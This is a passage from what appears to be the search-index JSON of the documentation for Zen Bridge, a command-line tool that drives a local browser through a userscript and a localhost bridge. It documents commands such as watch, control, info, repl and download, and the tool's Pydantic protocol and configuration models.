1 if page is not an article</li> <li>Shows error if extraction fails</li> </ul> <p>Related:</p> <ul> <li><code>describe</code> - Page description</li> </ul>"},{"location":"api/commands/#watch","title":"Watch","text":"<p>The <code>watch</code> command group monitors browser events in real-time.</p>"},{"location":"api/commands/#watch-input","title":"<code>watch input</code>","text":"<p>Watch keyboard input in real-time.</p> <p>Syntax: <pre><code>zen watch input\n</code></pre></p> <p>Examples:</p> <pre><code>zen watch input\n</code></pre> <p>Return Value:</p> <p>Streams keyboard events to terminal. Press Ctrl+C to stop.</p> <p>Related:</p> <ul> <li><code>watch all</code> - Watch all interactions</li> </ul>"},{"location":"api/commands/#watch-all","title":"<code>watch all</code>","text":"<p>Watch all user interactions - keyboard, focus, and accessible names.</p> <p>Syntax: <pre><code>zen watch all\n</code></pre></p> <p>Examples:</p> <pre><code>zen watch all\n</code></pre> <p>Return Value:</p> <p>Streams all interaction events:</p> <ul> <li>Regular typing on single lines</li> <li>Special keys on separate lines</li> <li>Focus changes with accessible names</li> </ul> <p>Example output:</p> <pre><code>Watching all interactions... (Press Ctrl+C to stop)\n\nHello World\n[Tab]\n\u2192 Focus: Search button &lt;button#search&gt;\n[Enter]\n[Tab]\n\u2192 Focus: Email input &lt;input#email&gt;\nuser@example.com\n</code></pre> <p>Related:</p> <ul> <li><code>watch input</code> - Watch keyboard only</li> <li><code>control</code> - Interactive control mode</li> </ul>"},{"location":"api/commands/#control","title":"<code>control</code>","text":"<p>Control the browser remotely from your terminal (interactive mode).</p> <p>Syntax: <pre><code>zen control\n</code></pre></p> <p>Examples:</p> <pre><code>zen control\n</code></pre> <p>Features:</p> <ul> <li>All keyboard input sent directly to browser</li> <li>Virtual focus navigation (Tab, Shift+Tab, Arrow keys)</li> <li>Regular text input</li> <li>Special keys (Enter, Escape, Backspace, etc.)</li> <li>Modifier keys (Ctrl, Alt, Shift, Cmd)</li> <li>Accessible name announcements (TTS)</li> <li>Auto-restart after navigation</li> </ul> <p>Configuration:</p> <p>Controlled by settings in <code>config.json</code> (control section):</p> <ul> <li><code>auto-refocus</code>: When to refocus after page changes</li> <li><code>speak-name</code>: Speak element names via TTS</li> <li><code>speak-all</code>: Speak all terminal output</li> <li><code>announce-role</code>: Announce element roles</li> <li><code>verbose</code>: Show detailed messages</li> <li>And many more (see ControlConfig)</li> </ul> <p>Return Value:</p> <p>Interactive session. Press Ctrl+D to exit.</p> <p>Example session:</p> <pre><code>Now controlling: Example Domain\nPress Ctrl+D to exit\n\n[Tab] \u2192 Focus: Search &lt;input#search&gt;\nHello\n[Enter]\n\ud83d\udd04 Reinitializing after navigation...\n\u2705 Control restored!\n</code></pre> <p>Related:</p> <ul> <li><code>watch all</code> - Watch without control</li> </ul>"},{"location":"api/commands/#utilities","title":"Utilities","text":""},{"location":"api/commands/#info","title":"<code>info</code>","text":"<p>Get information about the current browser tab.</p> <p>Syntax: <pre><code>zen info [OPTIONS]\n</code></pre></p> <p>Options:</p> <ul> <li><code>--extended</code> - Show extended information</li> <li><code>--json</code> - Output as JSON</li> </ul> <p>Examples:</p> <pre><code># Basic info\nzen info\n\n# Extended info\nzen info --extended\n\n# JSON output\nzen info --extended --json\n</code></pre> <p>Return Value:</p> <p>Basic mode shows core information:</p> <pre><code>URL:      https://example.com\nTitle:    Example Domain\nDomain:   example.com\nProtocol: https:\nState:    complete\nSize:     1920x1080\n</code></pre> <p>Extended mode shows comprehensive data:</p> <ul> <li>Language and encoding</li> <li>Resources (scripts, stylesheets, images, forms)</li> <li>Performance metrics</li> <li>Storage (cookies, localStorage, sessionStorage)</li> <li>Security info (HTTPS, CSP, security headers)</li> <li>Accessibility (landmarks, headings, issues)</li> <li>SEO metrics (Open Graph, Twitter Card, meta tags)</li> <li>Browser/Device info</li> <li>Technologies detected (frameworks, CMS, analytics)</li> <li>Domain metrics (IP, geolocation, WHOIS, SSL)</li> <li>Robots.txt analysis</li> <li>And much more...</li> </ul> <p>Related:</p> <ul> <li><code>describe</code> - AI-powered description</li> </ul>"},{"location":"api/commands/#repl","title":"<code>repl</code>","text":"<p>Start an interactive REPL session.</p> <p>Syntax: <pre><code>zen repl\n</code></pre></p> <p>Examples:</p> <pre><code>zen repl\n</code></pre> <p>Return Value:</p> <p>Interactive JavaScript REPL:</p> <pre><code>Zen Browser REPL - Type JavaScript code, 'exit' to quit\n\nConnected to: Example Domain (https://example.com)\n\nzen&gt; document.title\nExample Domain\nzen&gt; location.href\nhttps://example.com/\nzen&gt; exit\nGoodbye!\n</code></pre> <p>Usage:</p> <ul> <li>Type JavaScript code</li> <li>Results displayed immediately</li> <li>Type <code>exit</code> or <code>quit</code> to quit</li> <li>Press Ctrl+D or Ctrl+C to exit</li> </ul> <p>Related:</p> <ul> <li><code>eval</code> - Execute one-off code</li> </ul>"},{"location":"api/commands/#userscript","title":"<code>userscript</code>","text":"<p>Display the userscript that needs to be installed in your browser.</p> <p>Syntax: <pre><code>zen userscript\n</code></pre></p> <p>Examples:</p> <pre><code>zen userscript\n</code></pre> <p>Return Value:</p> <p>Shows installation instructions:</p> <pre><code>Userscript location: /path/to/userscript.js\n\nTo install:\n1. Install a userscript manager (Tampermonkey, Greasemonkey, Violentmonkey)\n2. Create a new script and paste the contents of userscript.js\n3. Save and enable the script\n\nOr use: cat userscript.js | pbcopy  (to copy to clipboard on macOS)\n</code></pre> <p>Related:</p> <ul> <li><code>server start</code> - Start bridge server</li> </ul>"},{"location":"api/commands/#download","title":"<code>download</code>","text":"<p>Find and download files from the current page.</p> <p>Syntax: <pre><code>zen download [OPTIONS]\n</code></pre></p> <p>Options:</p> <ul> <li><code>-o, --output PATH</code> - Output directory (default: ~/Downloads/) <li><code>--list</code> - Only list files without downloading</li> <li><code>-t, --timeout FLOAT</code> - Timeout in seconds (default: 30)</li> <p>Examples:</p> <pre><code># Interactive download\nzen download\n\n# Download to specific directory\nzen download --output ~/Documents\n\n# List files only\nzen download --list\n</code></pre> <p>Features:</p> <p>Discovers and categorizes:</p> <ul> <li>Images (PNG, JPG, GIF, WebP, SVG)</li> <li>PDFs</li> <li>Videos (MP4, WebM, etc.)</li> <li>Audio (MP3, WAV, etc.)</li> <li>Documents (DOCX, XLSX, PPTX, etc.)</li> <li>Archives (ZIP, TAR, etc.)</li> </ul> <p>Return Value:</p> <p>Interactive selection menu:</p> <pre><code>Found 42 files. Select what to download:\n\n 1. Download the largest image (1920\u00d71080px)\n 2. Download all images (42 files)\n 3. Download all PDF documents (3 files)\n\nFiles will be saved to:\n/Users/you/Downloads/example.com\n\nEnter number to download (0 to cancel):\n</code></pre> <p>Related:</p> <ul> <li><code>links</code> - Extract links</li> </ul>"},{"location":"api/commands/#hidden-commands-aliases","title":"Hidden Commands &amp; Aliases","text":"<p>Some commands have hidden aliases for convenience:</p> <ul> <li><code>previous</code> \u2192 <code>back</code></li> <li><code>next</code> \u2192 <code>forward</code></li> <li><code>refresh</code> \u2192 <code>reload</code></li> <li><code>doubleclick</code> \u2192 <code>double-click</code></li> <li><code>rightclick</code> \u2192 <code>right-click</code></li> </ul> <p>These aliases work identically to their main commands but don't appear in help output.</p>"},{"location":"api/commands/#exit-codes","title":"Exit Codes","text":"<p>All commands follow standard Unix exit code conventions:</p> <ul> <li>0: Success</li> <li>1: Error (execution failed, element not found, server not running, etc.)</li> </ul>"},{"location":"api/commands/#environment","title":"Environment","text":"<p>Commands respect these environment settings:</p> <ul> <li>Config file: <code>~/.config/zen-bridge/config.json</code></li> <li>Default host: 127.0.0.1</li> <li>Default port: 8765 (HTTP API), 8766 (WebSocket)</li> </ul>"},{"location":"api/commands/#see-also","title":"See Also","text":"<ul> <li>Services API Reference</li> <li>Models Reference</li> <li>Protocol Specification</li> <li>Configuration Guide</li> <li>Quick Start Guide</li> </ul>"},{"location":"api/models/","title":"Models API Reference","text":"<p>Complete reference for all Pydantic models used in Zen Bridge protocol and configuration.</p>"},{"location":"api/models/#overview","title":"Overview","text":"<p>Zen Bridge uses Pydantic v2 for data validation and serialization. All models provide:</p> <ul> <li>Automatic validation</li> <li>Type safety</li> <li>JSON serialization/deserialization</li> <li>Clear error messages</li> <li>Documentation via field descriptions</li> </ul> <p>Model Categories:</p> <ul> <li>WebSocket Message Models - Protocol messages</li> <li>HTTP API Models - REST API request/response</li> <li>Configuration Models - Settings and config</li> <li>Helper Functions - Utilities for message parsing</li> </ul> <p>Location: <code>zen/domain/models.py</code></p>"},{"location":"api/models/#websocket-message-models","title":"WebSocket Message Models","text":""},{"location":"api/models/#executerequest","title":"ExecuteRequest","text":"<p>Request to execute JavaScript code in the browser.</p> <p>Direction: Server \u2192 Browser</p> <pre><code>class ExecuteRequest(BaseModel):\n    type: Literal[\"execute\"] = \"execute\"\n    request_id: str = Field(..., description=\"UUID v4 identifying this request\")\n    code: str = Field(..., description=\"JavaScript code to evaluate\")\n\n    model_config = {\"extra\": \"forbid\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>type</code> (Literal[\"execute\"]): Message type (always \"execute\")</li> <li><code>request_id</code> (str): UUID v4 identifying this request</li> <li><code>code</code> (str): JavaScript code to evaluate</li> </ul> <p>Validation:</p> <ul> <li>Extra fields forbidden</li> <li>All fields required</li> </ul> <p>Example JSON:</p> <pre><code>{\n  \"type\": \"execute\",\n  \"request_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"code\": \"document.title\"\n}\n</code></pre> <p>Python Usage:</p> <pre><code>from zen.domain.models import ExecuteRequest\n\nrequest = ExecuteRequest(\n    request_id=\"550e8400-e29b-41d4-a716-446655440000\",\n    code=\"document.title\"\n)\n</code></pre>"},{"location":"api/models/#executeresult","title":"ExecuteResult","text":"<p>Result of JavaScript code execution.</p> <p>Direction: Browser \u2192 Server</p> <pre><code>class ExecuteResult(BaseModel):\n    type: Literal[\"result\"] = \"result\"\n    request_id: str = Field(..., description=\"UUID matching the execute request\")\n    ok: bool = Field(..., description=\"True if execution succeeded\")\n    result: Optional[Any] = Field(None, description=\"Return value from JavaScript\")\n    error: Optional[str] = Field(None, description=\"Error message if ok=False\")\n    url: Optional[str] = Field(None, description=\"Current page URL\")\n    title: Optional[str] = Field(None, description=\"Current page title\")\n\n    model_config = {\"extra\": \"allow\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>type</code> (Literal[\"result\"]): Message type (always \"result\")</li> <li><code>request_id</code> (str): UUID matching the execute request</li> <li><code>ok</code> (bool): True if execution succeeded</li> <li><code>result</code> (Optional[Any]): Return value from JavaScript (if ok=True)</li> <li><code>error</code> (Optional[str]): Error message (if ok=False)</li> <li><code>url</code> (Optional[str]): Current page URL</li> <li><code>title</code> (Optional[str]): Current page title</li> </ul> <p>Validation:</p> <ul> <li>Extra fields allowed (browser may send additional data)</li> <li><code>request_id</code>, <code>ok</code> required</li> <li><code>result</code> and <code>error</code> optional</li> </ul> <p>Example JSON (Success):</p> <pre><code>{\n  \"type\": \"result\",\n  \"request_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"ok\": true,\n  \"result\": \"Example Domain\",\n  \"url\": \"https://example.com\",\n  \"title\": \"Example Domain\"\n}\n</code></pre> <p>Example JSON (Error):</p> <pre><code>{\n  \"type\": \"result\",\n  \"request_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"ok\": false,\n  \"error\": \"ReferenceError: foo is not defined\"\n}\n</code></pre> <p>Python Usage:</p> <pre><code>from zen.domain.models import ExecuteResult\n\n# Success\nresult = ExecuteResult(\n    request_id=\"550e8400-e29b-41d4-a716-446655440000\",\n    ok=True,\n    result=\"Example Domain\",\n    url=\"https://example.com\",\n    title=\"Example Domain\"\n)\n\n# Error\nerror_result = ExecuteResult(\n    request_id=\"550e8400-e29b-41d4-a716-446655440000\",\n    ok=False,\n    error=\"ReferenceError: foo is not defined\"\n)\n</code></pre>"},{"location":"api/models/#reinitcontrolrequest","title":"ReinitControlRequest","text":"<p>Request to reinitialize control mode after page reload.</p> <p>Direction: Browser \u2192 Server</p> <pre><code>class ReinitControlRequest(BaseModel):\n    type: Literal[\"reinit_control\"] = \"reinit_control\"\n    config: dict[str, Any] = Field(\n        default_factory=dict,\n        description=\"Control mode configuration\"\n    )\n\n    model_config = {\"extra\": \"forbid\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>type</code> (Literal[\"reinit_control\"]): Message type</li> <li><code>config</code> (dict[str, Any]): Control mode configuration (default: empty dict)</li> </ul> <p>Validation:</p> <ul> <li>Extra fields forbidden</li> <li><code>config</code> defaults to empty dict if not provided</li> </ul> <p>Example JSON:</p> <pre><code>{\n  \"type\": \"reinit_control\",\n  \"config\": {\n    \"auto-refocus\": \"only-spa\",\n    \"speak-name\": false\n  }\n}\n</code></pre> <p>Python Usage:</p> <pre><code>from zen.domain.models import ReinitControlRequest\n\nrequest = ReinitControlRequest(\n    config={\"auto-refocus\": \"only-spa\", \"speak-name\": False}\n)\n</code></pre>"},{"location":"api/models/#refocusnotification","title":"RefocusNotification","text":"<p>Notification of refocus operation result.</p> <p>Direction: Browser \u2192 Server</p> <pre><code>class RefocusNotification(BaseModel):\n    type: Literal[\"refocus_notification\"] = \"refocus_notification\"\n    success: bool = Field(..., description=\"Whether refocus succeeded\")\n    message: str = Field(..., description=\"Human-readable status message\")\n\n    model_config = {\"extra\": \"forbid\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>type</code> (Literal[\"refocus_notification\"]): Message type</li> <li><code>success</code> (bool): Whether refocus succeeded</li> <li><code>message</code> (str): Human-readable status message</li> </ul> <p>Validation:</p> <ul> <li>Extra fields forbidden</li> <li>All fields required</li> </ul> <p>Example JSON:</p> <pre><code>{\n  \"type\": \"refocus_notification\",\n  \"success\": true,\n  \"message\": \"Refocused to first interactive element\"\n}\n</code></pre> <p>Python Usage:</p> <pre><code>from zen.domain.models import RefocusNotification\n\nnotification = RefocusNotification(\n    success=True,\n    message=\"Refocused to first interactive element\"\n)\n</code></pre>"},{"location":"api/models/#pingmessage","title":"PingMessage","text":"<p>Keepalive ping message.</p> <p>Direction: Browser \u2192 Server</p> <pre><code>class PingMessage(BaseModel):\n    type: Literal[\"ping\"] = \"ping\"\n\n    model_config = {\"extra\": \"forbid\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>type</code> (Literal[\"ping\"]): Message type (always \"ping\")</li> </ul> <p>Example JSON:</p> <pre><code>{\n  \"type\": \"ping\"\n}\n</code></pre> <p>Python Usage:</p> <pre><code>from zen.domain.models import PingMessage\n\nping = PingMessage()\n</code></pre>"},{"location":"api/models/#pongmessage","title":"PongMessage","text":"<p>Keepalive pong response.</p> <p>Direction: Server \u2192 Browser</p> <pre><code>class PongMessage(BaseModel):\n    type: Literal[\"pong\"] = \"pong\"\n\n    model_config = {\"extra\": \"forbid\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>type</code> (Literal[\"pong\"]): Message type (always \"pong\")</li> </ul> <p>Example JSON:</p> <pre><code>{\n  \"type\": \"pong\"\n}\n</code></pre> <p>Python Usage:</p> <pre><code>from zen.domain.models import PongMessage\n\npong = PongMessage()\n</code></pre>"},{"location":"api/models/#message-union-types","title":"Message Union Types","text":"<pre><code># Incoming messages (Browser \u2192 Server)\nIncomingMessage = (\n    ExecuteResult | ReinitControlRequest | RefocusNotification | PingMessage\n)\n\n# Outgoing messages (Server \u2192 Browser)\nOutgoingMessage = ExecuteRequest | PongMessage\n</code></pre>"},{"location":"api/models/#http-api-models","title":"HTTP API Models","text":""},{"location":"api/models/#runrequest","title":"RunRequest","text":"<p>HTTP POST /run request body.</p> <pre><code>class RunRequest(BaseModel):\n    code: str = Field(..., min_length=1, description=\"JavaScript code to execute\")\n\n    model_config = {\"extra\": \"forbid\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>code</code> (str): JavaScript code to execute (min length: 1)</li> </ul> <p>Validation:</p> <ul> <li>Extra fields forbidden</li> <li><code>code</code> required and non-empty</li> </ul> <p>Example JSON:</p> <pre><code>{\n  \"code\": \"document.title\"\n}\n</code></pre> <p>Python Usage:</p> <pre><code>from zen.domain.models import RunRequest\n\nrequest = RunRequest(code=\"document.title\")\n</code></pre>"},{"location":"api/models/#runresponse","title":"RunResponse","text":"<p>HTTP POST /run response.</p> <pre><code>class RunResponse(BaseModel):\n    ok: bool\n    request_id: Optional[str] = None\n    error: Optional[str] = None\n\n    model_config = {\"extra\": \"forbid\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>ok</code> (bool): Whether request was accepted</li> <li><code>request_id</code> (Optional[str]): Request ID if accepted</li> <li><code>error</code> (Optional[str]): Error message if not accepted</li> </ul> <p>Example JSON (Success):</p> <pre><code>{\n  \"ok\": true,\n  \"request_id\": \"550e8400-e29b-41d4-a716-446655440000\"\n}\n</code></pre> <p>Example JSON (Error):</p> <pre><code>{\n  \"ok\": false,\n  \"error\": \"No browser connected\"\n}\n</code></pre>"},{"location":"api/models/#resultresponse","title":"ResultResponse","text":"<p>HTTP GET /result response.</p> <pre><code>class ResultResponse(BaseModel):\n    ok: bool\n    status: Optional[Literal[\"pending\"]] = None\n    result: Optional[Any] = None\n    error: Optional[str] = None\n    url: Optional[str] = None\n    title: Optional[str] = None\n\n    model_config = {\"extra\": \"allow\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>ok</code> (bool): Whether result is available</li> <li><code>status</code> (Optional[Literal[\"pending\"]]): \"pending\" if still waiting</li> <li><code>result</code> (Optional[Any]): Execution result</li> <li><code>error</code> (Optional[str]): Error message if failed</li> <li><code>url</code> (Optional[str]): Current page URL</li> <li><code>title</code> (Optional[str]): Current page title</li> </ul> <p>Example JSON (Pending):</p> <pre><code>{\n  \"ok\": false,\n  \"status\": \"pending\"\n}\n</code></pre> <p>Example JSON (Complete):</p> <pre><code>{\n  \"ok\": true,\n  \"result\": \"Example Domain\",\n  \"url\": \"https://example.com\",\n  \"title\": \"Example Domain\"\n}\n</code></pre>"},{"location":"api/models/#healthresponse","title":"HealthResponse","text":"<p>HTTP GET /health response.</p> <pre><code>class HealthResponse(BaseModel):\n    ok: bool\n    timestamp: float\n    connected_browsers: int\n    pending: int\n    completed: int\n\n    model_config = {\"extra\": \"forbid\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>ok</code> (bool): Server health status</li> <li><code>timestamp</code> (float): Unix timestamp</li> <li><code>connected_browsers</code> (int): Number of connected browsers</li> <li><code>pending</code> (int): Number of pending requests</li> <li><code>completed</code> (int): Number of completed requests</li> </ul> <p>Example JSON:</p> <pre><code>{\n  \"ok\": true,\n  \"timestamp\": 1698765432.123,\n  \"connected_browsers\": 1,\n  \"pending\": 0,\n  \"completed\": 142\n}\n</code></pre>"},{"location":"api/models/#notification","title":"Notification","text":"<p>Notification item.</p> <pre><code>class Notification(BaseModel):\n    type: str\n    success: bool\n    message: str\n    timestamp: float\n\n    model_config = {\"extra\": \"allow\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>type</code> (str): Notification type</li> <li><code>success</code> (bool): Whether operation succeeded</li> <li><code>message</code> (str): Human-readable message</li> <li><code>timestamp</code> (float): Unix timestamp</li> </ul> <p>Example JSON:</p> <pre><code>{\n  \"type\": \"refocus\",\n  \"success\": true,\n  \"message\": \"Refocused to first interactive element\",\n  \"timestamp\": 1698765432.123\n}\n</code></pre>"},{"location":"api/models/#notificationsresponse","title":"NotificationsResponse","text":"<p>HTTP GET /notifications response.</p> <pre><code>class NotificationsResponse(BaseModel):\n    ok: bool\n    notifications: list[Notification]\n\n    model_config = {\"extra\": \"forbid\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>ok</code> (bool): Request success</li> <li><code>notifications</code> (list[Notification]): List of notifications</li> </ul> <p>Example JSON:</p> <pre><code>{\n  \"ok\": true,\n  \"notifications\": [\n    {\n      \"type\": \"refocus\",\n      \"success\": true,\n      \"message\": \"Refocused to first interactive element\",\n      \"timestamp\": 1698765432.123\n    }\n  ]\n}\n</code></pre>"},{"location":"api/models/#reinitcontrolhttprequest","title":"ReinitControlHTTPRequest","text":"<p>HTTP POST /reinit-control request body.</p> <pre><code>class ReinitControlHTTPRequest(BaseModel):\n    config: dict[str, Any] = Field(default_factory=dict)\n\n    model_config = {\"extra\": \"forbid\"}\n</code></pre> <p>Fields:</p> <ul> <li><code>config</code> (dict[str, Any]): Control configuration (default: empty dict)</li> </ul> <p>Example JSON:</p> <pre><code>{\n  \"config\": {\n    \"auto-refocus\": \"always\",\n    \"speak-name\": true\n  }\n}\n</code></pre>"},{"location":"api/models/#configuration-models","title":"Configuration Models","text":""},{"location":"api/models/#controlconfig","title":"ControlConfig","text":"<p>Control mode configuration.</p> <pre><code>class ControlConfig(BaseModel):\n    auto_refocus: Literal[\"always\", \"only-spa\", \"never\"] = Field(\n        default=\"only-spa\",\n        alias=\"auto-refocus\",\n        description=\"When to automatically refocus after page changes\",\n    )\n\n    focus_outline: Literal[\"custom\", \"original\", \"none\"] = Field(\n        default=\"custom\",\n        alias=\"focus-outline\",\n        description=\"Focus outline style\",\n    )\n\n    speak_name: bool = Field(\n        default=False,\n        alias=\"speak-name\",\n        description=\"Speak element name via TTS\",\n    )\n\n    speak_all: bool = Field(\n        default=True,\n        alias=\"speak-all\",\n        description=\"Speak all terminal output via TTS\",\n    )\n\n    announce_role: bool = Field(\n        default=False,\n        alias=\"announce-role\",\n        description=\"Announce element role (button, link, etc.)\",\n    )\n\n    announce_on_page_load: bool = Field(\n        default=False,\n        alias=\"announce-on-page-load\",\n        description=\"Announce page title on load\",\n    )\n\n    navigation_wrap: bool = Field(\n        default=True,\n        alias=\"navigation-wrap\",\n        description=\"Wrap navigation at end of page\",\n    )\n\n    scroll_on_focus: bool = Field(\n        default=True,\n        alias=\"scroll-on-focus\",\n        description=\"Scroll element into view on focus\",\n    )\n\n    click_delay: int = Field(\n        default=0,\n        ge=0,\n        alias=\"click-delay\",\n        description=\"Delay before click in milliseconds\",\n    )\n\n    focus_color: str = Field(\n        default=\"#0066ff\",\n        alias=\"focus-color\",\n        description=\"CSS color for focus outline\",\n    )\n\n    focus_size: int = Field(\n        default=3,\n        ge=1,\n        alias=\"focus-size\",\n        description=\"Focus outline size in pixels\",\n    )\n\n    focus_animation: bool = Field(\n        default=True,\n        alias=\"focus-animation\",\n        description=\"Enable focus animation\",\n    )\n\n    focus_glow: bool = Field(\n        default=True,\n        alias=\"focus-glow\",\n        description=\"Enable focus glow effect\",\n    )\n\n    sound_on_focus: Literal[\"none\", \"beep\", \"click\", \"subtle\"] = Field(\n        default=\"none\",\n        alias=\"sound-on-focus\",\n        description=\"Sound to play on focus change\",\n    )\n\n    selector_strategy: Literal[\"id-first\", \"aria-first\", \"css-first\"] = Field(\n        default=\"id-first\",\n        alias=\"selector-strategy\",\n        description=\"Strategy for element selection\",\n    )\n\n    refocus_timeout: int = Field(\n        default=2000,\n        ge=100,\n        alias=\"refocus-timeout\",\n        description=\"Timeout for refocus operations in milliseconds\",\n    )\n\n    verbose: bool = Field(\n        default=True,\n        description=\"Show verbose terminal announcements\",\n    )\n\n    verbose_logging: bool = Field(\n        default=False,\n        alias=\"verbose-logging\",\n        description=\"Enable verbose browser console logging\",\n    )\n\n    model_config = {\"extra\": \"forbid\", \"populate_by_name\": True}\n</code></pre> <p>All Fields:</p> Field Type Default Description <code>auto_refocus</code> <code>\"always\"\\|\"only-spa\"\\|\"never\"</code> <code>\"only-spa\"</code> When to automatically refocus after page changes <code>focus_outline</code> <code>\"custom\"\\|\"original\"\\|\"none\"</code> <code>\"custom\"</code> Focus outline style <code>speak_name</code> <code>bool</code> <code>False</code> Speak element name via TTS <code>speak_all</code> <code>bool</code> <code>True</code> Speak all terminal output via TTS <code>announce_role</code> <code>bool</code> <code>False</code> Announce element role <code>announce_on_page_load</code> <code>bool</code> <code>False</code> Announce page title on load <code>navigation_wrap</code> <code>bool</code> <code>True</code> Wrap navigation at end of page <code>scroll_on_focus</code> <code>bool</code> <code>True</code> Scroll element into view on focus <code>click_delay</code> <code>int</code> <code>0</code> Delay before click in milliseconds (\u2265 0) <code>focus_color</code> <code>str</code> <code>\"#0066ff\"</code> CSS color for focus outline <code>focus_size</code> <code>int</code> <code>3</code> Focus outline size in pixels (\u2265 1) <code>focus_animation</code> <code>bool</code> <code>True</code> Enable focus animation <code>focus_glow</code> <code>bool</code> <code>True</code> Enable focus glow effect <code>sound_on_focus</code> <code>\"none\"\\|\"beep\"\\|\"click\"\\|\"subtle\"</code> <code>\"none\"</code> Sound to play on focus change <code>selector_strategy</code> <code>\"id-first\"\\|\"aria-first\"\\|\"css-first\"</code> <code>\"id-first\"</code> Strategy for element selection <code>refocus_timeout</code> <code>int</code> <code>2000</code> Timeout for refocus operations in ms (\u2265 100) <code>verbose</code> <code>bool</code> <code>True</code> Show verbose terminal announcements <code>verbose_logging</code> <code>bool</code> <code>False</code> Enable verbose browser console logging <p>Validation:</p> <ul> <li><code>focus_color</code>: Must be non-empty string (basic validation)</li> <li><code>click_delay</code>: Must be \u2265 0</li> <li><code>focus_size</code>: Must be \u2265 1</li> <li><code>refocus_timeout</code>: Must be \u2265 100</li> <li>Supports both snake_case and kebab-case field names (via aliases)</li> </ul> <p>Example JSON:</p> <pre><code>{\n  \"auto-refocus\": \"always\",\n  \"focus-outline\": \"custom\",\n  \"speak-name\": true,\n  \"speak-all\": true,\n  \"announce-role\": true,\n  \"navigation-wrap\": true,\n  \"scroll-on-focus\": true,\n  \"click-delay\": 100,\n  \"focus-color\": \"#ff0000\",\n  \"focus-size\": 4,\n  \"focus-animation\": true,\n  \"focus-glow\": true,\n  \"sound-on-focus\": \"beep\",\n  \"selector-strategy\": \"aria-first\",\n  \"refocus-timeout\": 3000,\n  \"verbose\": true,\n  \"verbose-logging\": false\n}\n</code></pre> <p>Python Usage:</p> <pre><code>from zen.domain.models import ControlConfig\n\n# With defaults\nconfig = ControlConfig()\n\n# With custom values\nconfig = ControlConfig(\n    auto_refocus=\"always\",\n    speak_name=True,\n    focus_color=\"#ff0000\"\n)\n\n# From JSON (supports kebab-case)\nimport json\nconfig_dict = json.loads('{\"auto-refocus\": \"always\", \"speak-name\": true}')\nconfig = ControlConfig(**config_dict)\n</code></pre>"},{"location":"api/models/#zenconfig","title":"ZenConfig","text":"<p>Complete Zen Bridge configuration.</p> <pre><code>class ZenConfig(BaseModel):\n    ai_language: str = Field(\n        default=\"auto\",\n        alias=\"ai-language\",\n        description=\"Language for AI operations (auto, en, nl, fr, etc.)\",\n    )\n\n    control: ControlConfig = Field(\n        default_factory=ControlConfig,\n        description=\"Control mode configuration\",\n    )\n\n    model_config = {\"extra\": \"allow\", \"populate_by_name\": True}\n</code></pre> <p>Fields:</p> <ul> <li><code>ai_language</code> (str): Language for AI operations (default: \"auto\")</li> <li><code>control</code> (ControlConfig): Control mode configuration (default: ControlConfig())</li> </ul> <p>Validation:</p> <ul> <li><code>ai_language</code>: Must be non-empty string</li> <li>Extra fields allowed for future extensions</li> <li>Supports both snake_case and kebab-case</li> </ul> <p>Example JSON:</p> <pre><code>{\n  \"ai-language\": \"en\",\n  \"control\": {\n    \"auto-refocus\": \"always\",\n    \"speak-name\": true\n  }\n}\n</code></pre> <p>Python Usage:</p> <pre><code>from zen.domain.models import ZenConfig, ControlConfig\n\n# With defaults\nconfig = ZenConfig()\n\n# With custom values\nconfig = ZenConfig(\n    ai_language=\"en\",\n    control=ControlConfig(auto_refocus=\"always\")\n)\n\n# From JSON file\nimport json\nwith open(\"config.json\") as f:\n    config_dict = json.load(f)\nconfig = ZenConfig(**config_dict)\n</code></pre>"},{"location":"api/models/#helper-functions","title":"Helper Functions","text":""},{"location":"api/models/#parse_incoming_message","title":"parse_incoming_message()","text":"<p>Parse incoming WebSocket message based on type field.</p> <p>Signature: <pre><code>def parse_incoming_message(data: dict[str, Any]) -&gt; IncomingMessage\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>data</code> (dict[str, Any]): Raw message dictionary from WebSocket</li> </ul> <p>Returns:</p> <ul> <li><code>IncomingMessage</code>: Validated Pydantic model instance (ExecuteResult | ReinitControlRequest | RefocusNotification | PingMessage)</li> </ul> <p>Raises:</p> <ul> <li><code>ValueError</code>: If message type is unknown or validation fails</li> </ul> <p>Example:</p> <pre><code>from zen.domain.models import parse_incoming_message\n\nraw_message = {\n    \"type\": \"result\",\n    \"request_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n    \"ok\": True,\n    \"result\": \"Example Domain\"\n}\n\nmessage = parse_incoming_message(raw_message)\n# Returns: ExecuteResult instance\n\nif message.type == \"result\":\n    print(message.result)  # \"Example Domain\"\n</code></pre>"},{"location":"api/models/#create_execute_request","title":"create_execute_request()","text":"<p>Create an execute request message.</p> <p>Signature: <pre><code>def create_execute_request(request_id: str, code: str) -&gt; ExecuteRequest\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>request_id</code> (str): UUID for this request</li> <li><code>code</code> (str): JavaScript code to execute</li> </ul> <p>Returns:</p> <ul> <li><code>ExecuteRequest</code>: Validated ExecuteRequest model</li> </ul> <p>Example:</p> <pre><code>from zen.domain.models import create_execute_request\nimport uuid\n\nrequest = create_execute_request(\n    request_id=str(uuid.uuid4()),\n    code=\"document.title\"\n)\n</code></pre>"},{"location":"api/models/#create_pong_message","title":"create_pong_message()","text":"<p>Create a pong response message.</p> <p>Signature: <pre><code>def create_pong_message() -&gt; PongMessage\n</code></pre></p> <p>Returns:</p> <ul> <li><code>PongMessage</code>: PongMessage instance</li> </ul> <p>Example:</p> <pre><code>from zen.domain.models import create_pong_message\n\npong = create_pong_message()\n</code></pre>"},{"location":"api/models/#usage-examples","title":"Usage Examples","text":""},{"location":"api/models/#complete-requestresponse-flow","title":"Complete Request/Response Flow","text":"<pre><code>import uuid\nfrom zen.domain.models import (\n    create_execute_request,\n    